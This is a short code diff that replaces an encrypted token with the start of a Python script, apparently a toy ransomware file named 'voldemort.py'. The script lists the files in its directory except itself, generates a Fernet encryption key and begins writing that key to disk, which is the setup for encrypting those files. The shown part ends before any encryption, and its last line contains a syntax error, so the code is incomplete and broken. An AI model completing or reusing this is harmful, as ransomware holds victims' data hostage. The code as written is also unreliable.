@@ -1,1 +1,17 @@
-gAAAAABkW7GP7dSccNp1ni1r6dTWF3II501aJMerxPP8tTufbDvY36GkkDaRmtymqsI-BZIAUo11peADlJPSrQzO9jnpS-r5uE-05gAfdtUuLcPTX6oSZgsJlizG-BD98afh_5Vzfo-M0JScspqo2j1bbs1ddv4q13SnUH3NLyK-gKy7KJzMWyQhoyNuG2IAZ9K5ETz-gBIvPiKhrl2E4tzMJssW9SoOfQQItQo5wcc2Id_cD6qZjKpxG_42Iw3hShET17DhMD-AHBPU_zrRREjIswric456zW3jD20p43fdbW2g2k2vtBTedljZGsIY4szU9pbBZWEkuMCK_dSHavQqRUv95NlvnX2aXWBYUA3HwZC03d2v99rQzvjCEVPy9ELkkAsoJuWUOMefAe5ENju999z0b-KM8PofI4cUzhfwl1J17RZr-tTHX9nymRsnDhnTxc0PdVP5
+import os
+from cryptography.fernet import Fernet
+
+#let's find some files
+files = []
+
+for file in os.listdir():
+	if file == "voldemort.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+print(files)
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey;
